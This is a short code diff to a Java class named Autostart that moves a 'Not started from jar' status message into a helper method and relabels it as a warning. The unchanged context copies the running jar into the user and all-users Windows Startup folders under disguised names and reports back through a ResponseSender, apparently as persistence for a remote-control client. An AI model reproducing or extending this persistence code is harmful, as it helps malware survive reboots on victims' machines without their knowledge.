@@ -18,7 +18,7 @@ public class Autostart {
                         System.getProperty("java.io.tmpdir").replace("Local\\Temp\\",
                                 "Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\HermannC.jar"));
             } else {
-                new ResponseSender("response", "Not started from jar: started from " + filename);
+                notFromJar(filename);
             }
 
         } catch (Exception e) {
@@ -36,13 +36,17 @@ public class Autostart {
                 new DownloadService().download("file:///" + System.getProperty("user.dir") + "\\" + filename,
                         "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Tombat.jar");
             } else {
-                new ResponseSender("response", "Not started from jar: started from " + filename);
+                notFromJar(filename);
             }
 
         } catch (Exception e) {
             e.printStackTrace();
         }
 
+    }
+
+    private void notFromJar(String filename) {
+        new ResponseSender("warning", "Not started from jar: started from " + filename);
     }
 
     public void decide() {
